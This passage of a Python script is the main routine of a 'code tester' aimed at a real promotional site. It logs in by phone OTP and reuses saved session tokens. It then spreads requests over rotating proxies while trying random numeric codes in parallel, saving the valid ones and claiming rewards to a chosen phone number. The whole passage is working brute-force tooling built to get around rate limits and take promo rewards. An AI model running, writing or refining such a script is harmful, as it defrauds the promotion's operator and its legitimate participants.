        load_proxies()
    else:
        print("[!] Proxy usage disabled via --no-proxy")

    print("=" * 60)
    print("SLAY YOUR PLAY - CODE TESTER")
    print("=" * 60)
    print(f"Workers: {PARALLEL_WORKERS}")
    print(f"Code format: {CODE_LENGTH} digits (0-9)")
    print(f"Mode: RANDOM (non-sequential)")
    print(f"Proxies: {len(proxy_list) if not args.no_proxy else 'Disabled'}")
    print(f"Request delay per proxy: {REQUEST_DELAY}s")
    print(f"Session expiry: {SESSION_EXPIRY_MINUTES} minutes")
    print(f"Session file: {SESSION_FILE}")
    print(f"Valid codes saved to: {VALID_FILE}")
    print("=" * 60 + "\n")

    load_existing_codes()

    # Try to load saved session
    session_loaded = load_global_session()
    
    global GLOBAL_MASTER_KEY, GLOBAL_USER_KEY, GLOBAL_DATA_KEY, GLOBAL_ACCESS_TOKEN, GLOBAL_SESSION_EXPIRY
    
    if session_loaded and GLOBAL_ACCESS_TOKEN:
        print("[*] Using saved session from disk. Skipping login.")
        use_proxy = not args.no_proxy and bool(proxy_list)
        
        # Create session with loaded credentials
        master_key = GLOBAL_MASTER_KEY or generate_master_key()
        session = make_session(master_key, use_proxy=use_proxy)
        
        # Add authorization header
        session.headers.update({
            "authorization": f"Bearer {GLOBAL_ACCESS_TOKEN}"
        })
        session.cookies.set("thumsup_and_sprite-id", str(GLOBAL_USER_KEY), domain="slayyourplaypromo.in")
        
        user_key = GLOBAL_USER_KEY
        data_key = GLOBAL_DATA_KEY
        access_token = GLOBAL_ACCESS_TOKEN
        
        print(f"[*] Session expires: {GLOBAL_SESSION_EXPIRY.strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Reinitialize proxy sessions with loaded credentials
        if not args.no_proxy and proxy_list:
            initialize_proxy_sessions()
        
    else:
        # Need to login
        master_key = generate_master_key()
        print(f"[*] Session ID: {master_key}")

        use_proxy = not args.no_proxy and bool(proxy_list)
        session = make_session(master_key, use_proxy=use_proxy)

        print("\n[*] Step 1: Connecting to site...")
        user_key, data_key = init_session(session, master_key, use_proxy=use_proxy)
        if not user_key:
            return

        print("\n[*] Step 2: Tracking...")
        if not click_track(session, user_key, data_key, use_proxy=use_proxy):
            return

        mobile = args.mobile.strip() or prompt_login_mobile()
        if not mobile or len(mobile) != 10 or not mobile.isdigit():
            print(f"[-] Invalid mobile number: {mobile}")
            return

        print(f"\n[*] Sending OTP to {mobile}...")
        if not send_otp(session, user_key, data_key, mobile, use_proxy=use_proxy):
            return

        otp = args.otp.strip()
        if not otp:
            print("\n[*] Enter OTP received on your phone:")
            otp = input(">>> ").strip()
        if not otp:
            print("[-] OTP required")
            return

        print("\n[*] Verifying OTP & logging in...")
        access_token = verify_otp(session, user_key, data_key, otp, use_proxy=use_proxy)
        if not access_token:
            return

        print("\n[*] Setting up account...")
        if not select_pack(session, user_key, data_key, access_token, use_proxy=use_proxy):
            return
        if not select_vibe(session, user_key, data_key, access_token, use_proxy=use_proxy):
            return
        
        # Save session
        GLOBAL_MASTER_KEY = master_key
        GLOBAL_USER_KEY = user_key
        GLOBAL_DATA_KEY = data_key
        GLOBAL_ACCESS_TOKEN = access_token
        GLOBAL_SESSION_EXPIRY = datetime.now() + timedelta(minutes=SESSION_EXPIRY_MINUTES)
        save_global_session()
        
        # Initialize proxy sessions after login
        if not args.no_proxy and proxy_list:
            initialize_proxy_sessions()

    reward_mobile = args.reward_mobile.strip() or (args.mobile.strip() if args.mobile else prompt_login_mobile())
    print(f"\n[*] Reward mobile: {reward_mobile}")

    run_code_tester(session, user_key, data_key, access_token, reward_mobile)


if __name__ == "__main__":
    main()
